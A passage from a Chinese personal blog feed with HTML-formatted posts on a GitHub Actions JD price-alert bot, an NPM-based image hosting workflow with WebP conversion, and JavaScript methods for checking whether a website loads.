class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">qmsg_send</span>(<span class=\"params\">key, <span class=\"built_in\">id</span>, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://qmsg.zendee.cn/send/{0}?msg={1}&amp;qq={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(text), <span class=\"built_in\">id</span>)</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'code'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">notify</span>(<span class=\"params\"><span class=\"built_in\">id</span>,<span class=\"built_in\">type</span>,price,nowPrice</span>):</span></span><br><span class=\"line\">    <span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">    type:</span></span><br><span class=\"line\"><span class=\"string\">        0: 涨价</span></span><br><span class=\"line\"><span class=\"string\">        1: 无变化</span></span><br><span class=\"line\"><span class=\"string\">        2: 降价</span></span><br><span class=\"line\"><span class=\"string\">    id: 商品 ID</span></span><br><span class=\"line\"><span class=\"string\">    price: 差价</span></span><br><span class=\"line\"><span class=\"string\">    nowPrice: 现价</span></span><br><span class=\"line\"><span class=\"string\">    '''</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> svId <span class=\"keyword\">in</span> server:</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">send</span>(<span class=\"params\">title,content</span>):</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'wechat'</span>:</span><br><span class=\"line\">                wechat_send(wechat[<span class=\"string\">\"key\"</span>],title,content)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'qmsg'</span>:</span><br><span class=\"line\">                qmsg_send(qmsg[<span class=\"string\">\"key\"</span>],qmsg[<span class=\"string\">\"qid\"</span>],title + <span class=\"string\">\"\\n\"</span> + content)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">type</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 涨价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 涨价咯！价格相较于上次监测，高了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>,price,nowPrice)</span><br><span class=\"line\">            send(title,content)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">1</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"价格没有变化，不推送通知。\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">2</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 降价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 降价咯！价格相较于上次监测，低了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>, price,nowPrice)</span><br><span class=\"line\">            send(title, content)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>.github/workflows/auto.yml</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">Check</span> <span class=\"string\">Price</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">push:</span></span><br><span class=\"line\">    <span class=\"attr\">branches:</span> </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">master</span></span><br><span class=\"line\">  <span class=\"attr\">schedule:</span></span><br><span class=\"line\">    <span class=\"comment\"># 每 1 小时运行一次</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">cron:</span> <span class=\"string\">\"0 * * * *\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">check:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Clone</span> <span class=\"string\">repository</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">'Set up Python'</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-python@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">python-version:</span> <span class=\"number\">3.7</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Run</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">python</span> <span class=\"string\">main.py</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">date</span> <span class=\"string\">+\"%Y-%m-%d</span> <span class=\"string\">%H:%M:%S.%N\"</span> <span class=\"string\">&gt;</span> <span class=\"string\">date.txt</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-am</span> <span class=\"string\">\"Update price.json\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E6%B3%A8%E6%84%8F\" class=\"headerlink\" title=\"注意\"></a>注意</h2>\n<p>计划任务语法有 5 个字段，中间用空格分隔，每个字段代表一个时间单位。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌───────────── 分钟 (0 - 59)</span><br><span class=\"line\">│ ┌───────────── 小时 (0 - 23)</span><br><span class=\"line\">│ │ ┌───────────── 日 (1 - 31)</span><br><span class=\"line\">│ │ │ ┌───────────── 月 (1 - 12 或 JAN-DEC)</span><br><span class=\"line\">│ │ │ │ ┌───────────── 星期 (0 - 6 或 SUN-SAT)</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">* * * * *</span><br></pre></td></tr></table></figure><p>每个时间字段的含义：</p>\n<table>\n<thead><tr>\n<th align=\"center\">符号</th>\n<th align=\"center\">描述</th>\n<th align=\"center\">举例</th>\n</tr></thead>\n<tbody>\n<tr>\n<td align=\"center\"><code>*</code></td>\n<td align=\"center\">任意值</td>\n<td align=\"center\">\n<code>* * * * *</code> 每天每小时每分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>,</code></td>\n<td align=\"center\">值分隔符</td>\n<td align=\"center\">\n<code>1,3,4,7 * * * *</code> 每小时的 1 3 4 7 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>-</code></td>\n<td align=\"center\">范围</td>\n<td align=\"center\">\n<code>1-6 * * * *</code> 每小时的 1-6 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>/</code></td>\n<td align=\"center\">每</td>\n<td align=\"center\">\n<code>*/15 * * * *</code> 每隔 15 分钟</td>\n</tr>\n</tbody>\n</table>\n<blockquote><p>注：由于 GitHub Actions 的限制，如果设置为 <code>* * * * *</code> 实际的执行频率为每 5 分执行一次。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>新建文件 并 配置 <code>notify.py</code> 后，GitHub Action 就会定时执行代码。如果有降价或涨价，就会按照 <code>notify.py</code> 的配置进行通知。</p>\n<p>京东也有降价提醒的功能，但我实在是不想给 京东 开通知权限，经常推送商品广告。</p>\n<p>本文部分内容参考：<a href=\"https://github.com/justjavac/auto-green#readme\">justjavac/auto-green#readme</a></p>\n","link":"https://blog.yfun.top/posts/1238639652/"},{"title":"我的图床解决方案","date":"2021-05-08 10:30:00","description":"\n<p>博客的文章经常需要插入图片，如果我将文档与图片放在一起，那么图片的加载速度将会很慢，于是我使用了图床。</p>\n<p>图床的选择有很多，<a href=\"https://blog.yfun.top/posts/3867215122/\">笔者之前写过一篇关于免费图床的汇总</a>，本文就来介绍下我采用的方案：NPM。</p>\n<blockquote><p>本文假设您已有 NPM 账号、GitHub 账号。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%96%B0%E5%BB%BA%E4%BB%93%E5%BA%93\" class=\"headerlink\" title=\"新建仓库\"></a>新建仓库</h3>\n<p>新建一个 GitHub 仓库，公开或是私人都可以，此处不再赘述。</p>\n<p>在 Git 仓库中新建 <code>rawimg/.gitkeep</code> 与 <code>webpimg/.gitkeep</code> 两个文件。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%8E%B7%E5%8F%96%E4%BB%A4%E7%89%8C\" class=\"headerlink\" title=\"获取令牌\"></a>获取令牌</h3>\n<p>登录 <a href=\"https://npmjs.com/\">https://npmjs.com</a> ，点击右上角的头像，进入 <code>Access Token</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/1Xbrlw.png\"></p>\n<p>点击页面中的 <code>Generate New Token</code> 获取新的令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OQMmsB.png\"></p>\n<p>选择 <code>Automation</code>，点击 <code>Generate Token</code> 生成令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/4Ob3xs.png\"></p>\n<p>将生成的令牌复制下来。</p>\n<p>进入 GitHub 仓库，点击 <code>Settings</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UfBqld.png\"></p>\n<p>点击菜单栏中的 <code>Secrets</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/SStNlF.png\"></p>\n<p>点击 <code>New repository secret</code> 新建一个 Secret。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UYSnao.png\"></p>\n<p>Secret Name 为 <code>NPM_TOKEN</code>，Value 是你的 NPM 令牌，点击 <code>Add secret</code> 添加。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OY4C6A.png\"></p>\n<p>在仓库中新建 <code>package.json</code> 文件，参考如下：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">{</span><br><span class=\"line\">  <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"ocoke-osg\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"version\"</span>: <span class=\"string\">\"0.0.0\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"description\"</span>: <span class=\"string\">\"Somewhere to save the file from @oCoke\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"author\"</span>: <span class=\"string\">\"YFun(@oCoke)\"</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E4%B8%8E%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"图片转换与发布\"></a>图片转换与发布</h2>\n<p>为了方便多端写作，我使用 GitHub 临时存储所需的图片，GitHub Action 发布 NPM 包。</p>\n<p>WebP 可以大大缩减图片的尺寸，我们还可以借助 GitHub Action 在发布前自动转换。</p>  <details class=\"post-details\"><summary>GitHub Action 代码 (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">NPM</span> <span class=\"string\">&amp;</span> <span class=\"string\">WebP</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 在 Release 发布时 或手动执行</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">release:</span></span><br><span class=\"line\">     <span class=\"attr\">types:</span></span><br><span class=\"line\">       <span class=\"bullet\">-</span> <span class=\"string\">published</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"attr\">workflow_dispatch:</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">publish-npm:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"comment\"># Clone 仓库</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Checkout</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">ref:</span> <span class=\"string\">master</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装 Node.js    </span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Setup</span> <span class=\"string\">Node</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-node@v1</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">node-version:</span> <span class=\"string\">\"12.x\"</span></span><br><span class=\"line\">          <span class=\"attr\">registry-url:</span> <span class=\"string\">https://registry.npmjs.org/</span></span><br><span class=\"line\">        </span><br><span class=\"line\">      <span class=\"comment\"># rawimg/ 作为原始图片存储，webpimg/ 作为压缩图片存储处，最后合并。</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装相关插件，转换图片。</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Install</span> <span class=\"string\">&amp;</span> <span class=\"string\">Convert</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">install</span> <span class=\"string\">-g</span> <span class=\"string\">webp-batch-convert</span></span><br><span class=\"line\">          <span class=\"string\">cwebp-batch</span> <span class=\"string\">--in</span> <span class=\"string\">rawimg</span> <span class=\"string\">--out</span> <span class=\"string\">webpimg</span> <span class=\"string\">-q</span> <span class=\"number\">75</span> <span class=\"string\">-quiet</span></span><br><span class=\"line\">          <span class=\"string\">mv</span> <span class=\"string\">webpimg/*.webp</span> <span class=\"string\">rawimg/</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 发布 NPM 包</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Publish</span> <span class=\"string\">Package</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">version</span> <span class=\"string\">patch</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">publish</span></span><br><span class=\"line\">        <span class=\"attr\">env:</span></span><br><span class=\"line\">          <span class=\"attr\">NODE_AUTH_TOKEN:</span> <span class=\"string\">${{secrets.npm_token}}</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 删除 rawimg/ 和 webpimg/ 下的所有文件</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Delete</span> <span class=\"string\">Files</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">webpimg/*</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">rawimg/*</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">webpimg/.gitkeep</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">rawimg/.gitkeep</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-m</span> <span class=\"string\">\"Publish\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E4%BD%BF%E7%94%A8\" class=\"headerlink\" title=\"使用\"></a>使用</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%8A%E4%BC%A0\" class=\"headerlink\" title=\"上传\"></a>上传</h3>\n<p>将图片文件上传至仓库的 <code>rawimg/</code> 文件夹下即可。</p>\n<p>当然也可以使用 PicGo / UPic / HexoPlusPlus 等工具上传。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"发布\"></a>发布</h3>\n<p>在 GitHub 中新建 Release，将自动修改版本号并发布 NPM 包，无需手动修改 <code>package.json</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/t2afFy.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/0wAmRV.png\"></p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%AE%BF%E9%97%AE\" class=\"headerlink\" title=\"访问\"></a>访问</h3>\n<h4>\n<a href=\"https://blog.yfun.top/#%E6%8E%A8%E8%8D%90%E7%9A%84%E9%95%9C%E5%83%8F\" class=\"headerlink\" title=\"推荐的镜像\"></a>推荐的镜像</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/  <span class=\"comment\"># jsDelivr</span></span><br><span class=\"line\">https://unpkg.zhimg.com/ <span class=\"comment\"># 知乎</span></span><br><span class=\"line\">https://code.bdstatic.com/npm/ <span class=\"comment\"># 百度 (不推荐)</span></span><br><span class=\"line\">https://shadow.elemecdn.com/npm/ <span class=\"comment\"># 饿了么</span></span><br><span class=\"line\">https://unpkg.com/ <span class=\"comment\"># Unpkg</span></span><br></pre></td></tr></table></figure><p>镜像推荐选择访问速度快的，比较稳定的，拉取速度快的。</p>\n<p>我选择的是 jsDelivr，国内外速度都很优秀。</p>\n<h4>\n<a href=\"https://blog.yfun.top/#%E9%93%BE%E6%8E%A5\" class=\"headerlink\" title=\"链接\"></a>链接</h4>\n<p>以 jsDelivr 为例，原图链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].[suffix]</span><br></pre></td></tr></table></figure><p>WebP 图片链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].webp</span><br></pre></td></tr></table></figure><table>\n<thead><tr>\n<th>[值]</th>\n<th>说明</th>\n</tr></thead>\n<tbody>\n<tr>\n<td><code>package-name</code></td>\n<td>NPM 包的名称 (<code>package.json</code> 文件中 <code>name</code> 的值)</td>\n</tr>\n<tr>\n<td><code>version</code></td>\n<td>当前版本 (<code>package.json</code> 文件中 <code>version</code> 的值，通常需要在发布 Release 1 分钟后更新)</td>\n</tr>\n<tr>\n<td><code>filename</code></td>\n<td>文件名</td>\n</tr>\n<tr>\n<td><code>suffix</code></td>\n<td>文件后缀名</td>\n</tr>\n</tbody>\n</table>\n","link":"https://blog.yfun.top/posts/2876015612/"},{"title":"使用 JS 检测网址能否正常加载","date":"2021-04-09 12:42:00","description":"\n<p>有时我们需要判断用户能否加载某些网页或服务，如 Google、Disqus 等。</p>\n<p>而我们可以用 JavaScript 来实现这样的检测功能。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%B8%80\" class=\"headerlink\" title=\"方法一\"></a>方法一</h2>\n<p>使用 JavaScript 创建一个图片，设置图片的链接为 检测网址 + <code>favicon.ico</code>。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建一个图片</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> img = <span class=\"keyword\">new</span> Image();</span><br><span class=\"line\"><span class=\"comment\">// 设置图片的链接</span></span><br><span class=\"line\">img.src = <span class=\"string\">\"https://google.com/favicon.ico\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">img.onerror = img.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">img.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">img.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"无法加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"可以加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure><p>缺点：不是每一个网站都存在 <code>/favicon.ico</code> 文件，但如果加载特定文件的话挺好的。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%BA%8C\" class=\"headerlink\" title=\"方法二\"></a>方法二</h2>\n<p>使用 JavaScript 创建一个 iframe 标签，设置标签的链接为 检测网址。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建 iframe 标签</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> iframe = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"iframe\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设置 iframe 标签的网址</span></span><br><span class=\"line\">iframe.src=<span class=\"string\">\"https://google.com\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">    iframe.onerror = iframe.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">iframe.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">iframe.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) 